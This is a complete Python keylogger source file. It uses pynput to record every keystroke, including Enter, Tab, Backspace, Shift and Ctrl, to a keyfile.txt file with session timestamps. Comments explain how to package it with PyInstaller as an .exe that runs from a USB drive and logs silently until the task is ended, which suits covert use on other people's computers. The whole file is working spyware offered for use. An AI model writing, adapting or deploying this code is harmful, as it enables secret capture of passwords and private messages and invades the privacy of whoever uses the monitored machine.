import os
import sys
from pynput import keyboard
from datetime import datetime

# --- PORTABLE FILE PATH FIX ---
# This part is crucial for the .exe to work correctly on a USB.
# It checks if the script is running as a "frozen" bundle (PyInstaller) 
# or as a regular Python script.
if getattr(sys, 'frozen', False):
    # If compiled to .exe, find the folder where the .exe is sitting
    current_dir = os.path.dirname(sys.executable)
else:
    # If running as .py, find the folder where the script is sitting
    current_dir = os.path.dirname(os.path.abspath(__file__))

log_path = os.path.join(current_dir, "keyfile.txt")

def write_to_file(data):
    """Writes data to the log file immediately."""
    try:
        with open(log_path, "a", encoding="utf-8") as logKey:
            logKey.write(data)
    except Exception:
        # If the USB is pulled out or write-protected, this prevents a crash
        pass

def on_press(key):
    try:
        # Standard alphanumeric keys (a, b, c, 1, 2, 3...)
        if key.char is not None:
            write_to_file(key.char)
    except AttributeError:
        # Special keys mapping (Space, Enter, etc.)
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "\t",
            keyboard.Key.backspace: "[BKSP]"
        }
        
        if key in special_keys:
            write_to_file(special_keys[key])
        else:
            # Logs other keys like [Key.shift], [Key.ctrl]
            write_to_file(f" [{key}] ")

if __name__ == "__main__":
    # Create a timestamp for the start of the session
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    header = f"\n\n--- SESSION START: {now} ---\n"
    write_to_file(header)
    
    # Start the listener (This stays running until the task is ended)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()